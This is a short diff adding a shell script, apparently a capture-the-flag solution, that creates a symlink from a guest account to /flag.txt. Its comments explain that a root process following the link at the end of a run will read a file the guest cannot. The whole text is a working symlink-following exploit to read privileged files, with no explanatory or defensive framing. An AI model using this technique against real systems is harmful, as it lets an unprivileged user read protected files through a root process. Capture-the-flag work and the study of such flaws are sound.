@@ -1,0 +1,5 @@
+# Create a symlink as guest user
+# Guest cannot actually read file symlinked to
+# Symlink will be followed by root user at end of run
+ln -s /flag.txt flag
+exit
